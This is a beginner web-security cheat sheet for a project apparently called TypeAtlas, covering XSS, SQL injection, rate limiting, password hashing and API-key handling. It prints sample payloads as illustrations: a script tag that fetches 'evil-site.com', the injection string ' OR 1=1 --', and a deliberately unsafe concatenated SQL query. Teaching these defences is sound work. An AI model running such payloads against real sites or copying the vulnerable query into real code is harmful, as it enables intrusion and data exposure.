# Security Basics Cheat Sheet

## Purpose

Security is about preventing users, attackers, or mistakes from doing things they shouldn't.

Think:

```text
Security
    ↓

Never Trust Input
```

---

# Mental Model

```text
User Input
      ↓

Validate
      ↓

Process
      ↓

Store
```

Never:

```text
User Input
      ↓

Trust Immediately
```

---

# Common Threats

```text
XSS

SQL Injection

Password Theft

API Key Leakage

Abuse / Spam
```

---

# 1. XSS (Cross-Site Scripting)

## Concept

Attacker injects JavaScript into your website.

---

# Example

User submits:

```html
<script>
alert("Hacked");
</script>
```

---

Website renders it directly.

Result:

```text
Script Executes
```

---

# Dangerous

```html
<div>

    {userInput}

</div>
```

if not sanitized.

---

# Attack Example

Comment:

```html
<script>
fetch("evil-site.com")
</script>
```

Other users view page.

Script runs.

---

# Prevention

## React Protection

React escapes HTML by default.

Safe:

```tsx
<p>
    {comment}
</p>
```

---

React renders:

```html
&lt;script&gt;
```

instead of executing it.

---

## Dangerous API

```tsx
dangerouslySetInnerHTML
```

Avoid unless necessary.

---

Bad:

```tsx
<div
    dangerouslySetInnerHTML={{
        __html: userInput
    }}
/>
```

---

# Mental Model

```text
User Input
      ↓

Escape HTML
      ↓

Safe Display
```

---

# 2. SQL Injection

## Concept

Attacker manipulates SQL queries.

---

# Dangerous Example

```typescript
const query =

"SELECT * FROM users
 WHERE name = '"

+ username +

"'";
```

---

User enters:

```text
' OR 1=1 --
```

Query becomes:

```sql
SELECT *

FROM users

WHERE name = ''

OR 1=1
```

---

Result:

```text
All Users Returned
```

---

# Prevention

Use parameters.

---

Good:

```typescript
db.query(

    "SELECT * FROM users
     WHERE name = ?",

    [username]

);
```

---

Even Better

Using ORM:

```typescript
await prisma.user.findMany({
    where: {
        name: username
    }
});
```

---

Supabase:

```typescript
supabase

    .from("users")

    .select("*")

    .eq(
        "name",
        username
    );
```

---

# Mental Model

```text
Never Build SQL
With String Concatenation
```

---

# 3. Rate Limiting

## Concept

Prevent abuse by limiting requests.

---

# Problem

Attacker sends:

```text
1000 Requests/Second
```

---

Results:

```text
Server Overloaded

API Costs Increase

Spam
```

---

# Example

Allow:

```text
100 Requests
Per Minute
```

---

Then:

```text
Request 101
      ↓
Blocked
```

---

# Visual

```text
User
 ↓

Request Counter
 ↓

Too Many?
 ↓

Yes → Reject
No  → Allow
```

---

# Examples

Protect:

```text
Login

Registration

AI Endpoints

Search
```

---

# Mental Model

```text
Speed Limit
For APIs
```

---

# 4. Password Storage

## Concept

Never store plain passwords.

---

# Bad

Database:

```text
password123
```

---

Database Leak:

```text
Everyone Sees Password
```

---

# Good

Store hash.

Example:

```text
$2a$12$1h8asda...
```

---

# Hashing

```text
Password
    ↓

Hash Function
    ↓

Stored Hash
```

---

# Login

User enters:

```text
password123
```

Hash generated.

Compare:

```text
Stored Hash

vs

New Hash
```

---

Match:

```text
Login Success
```

---

# Common Algorithms

```text
bcrypt

argon2
```

---

# Never Use

```text
md5

sha1
```

for passwords.

---

# Mental Model

```text
Password
 ↓

Hash
 ↓

Store
```

---

# 5. API Key Protection

## Concept

API keys are secrets.

Treat them like passwords.

---

# Bad

```typescript
const apiKey =
    "secret-key";
```

Committed to GitHub.

---

Result:

```text
Anyone Can Use It
```

---

# Correct

```env
GEMINI_API_KEY=secret
```

---

Access:

```typescript
process.env.GEMINI_API_KEY
```

---

# Bad

```env
NEXT_PUBLIC_GEMINI_API_KEY=
```

Visible to everyone.

---

# Good

```env
GEMINI_API_KEY=
```

Server only.

---

# Mental Model

```text
API Key
 ↓

Server Secret
```

---

# TypeAtlas Security Examples

## Safe Gemini Usage

### Good

```text
Browser
 ↓

Next.js API Route
 ↓

Gemini API
```

---

### Bad

```text
Browser
 ↓

Gemini Directly
```

API key exposed.

---

# Safe Profile Editing

## Rule

```text
User Can Edit
Only Own Profile
```

---

Implementation:

```sql
auth.uid()

=

profiles.user_id
```

---

# Safe Debate Editing

```text
Author
 ↓
Can Edit

Others
 ↓
Denied
```

---

# Common Security Checklist

## User Input

```text
Validate
```

---

## Passwords

```text
Hash
```

---

## Database

```text
Parameterized Queries
```

---

## API Keys

```text
Environment Variables
```

---

## Authentication

```text
Require Login
```

---

## Authorization

```text
Check Ownership
```

---

## Abuse Prevention

```text
Rate Limit
```

---

# Typical Attack Surface

```text
Forms

Comments

Search

Login

Registration

AI Endpoints

File Uploads
```

These deserve extra attention.

---

# Real TypeAtlas Security Flow

```text
User Input
      ↓

Validation
      ↓

Authentication Check
      ↓

Authorization Check
      ↓

Database Query
      ↓

Response
```

---

# Security Mindset

Never assume:

```text
User Is Honest
```

Assume:

```text
Input Can Be Wrong

Input Can Be Malicious

Input Can Be Automated
```

---

# 90% of Security You'll Use

## XSS

```text
Escape HTML
```

---

## SQL Injection

```text
Parameterized Queries
```

---

## Passwords

```text
bcrypt

argon2
```

---

## API Keys

```text
Environment Variables
```

---

## Rate Limiting

```text
Limit Requests
```

---

# Core Memory

```text
XSS
 ↓
Injected JavaScript

SQL Injection
 ↓
Injected SQL

Rate Limiting
 ↓
Prevent Abuse

Password Hashing
 ↓
Protect Passwords

API Key Protection
 ↓
Keep Secrets Server-Side
```

---

# Most Important Rule

```text
Never Trust User Input
```

Everything else in application security is largely a consequence of that rule.

```text
Input
 ↓

Validate

Escape

Authorize

Limit

Log
```

Do those consistently and you eliminate a large percentage of common web application vulnerabilities.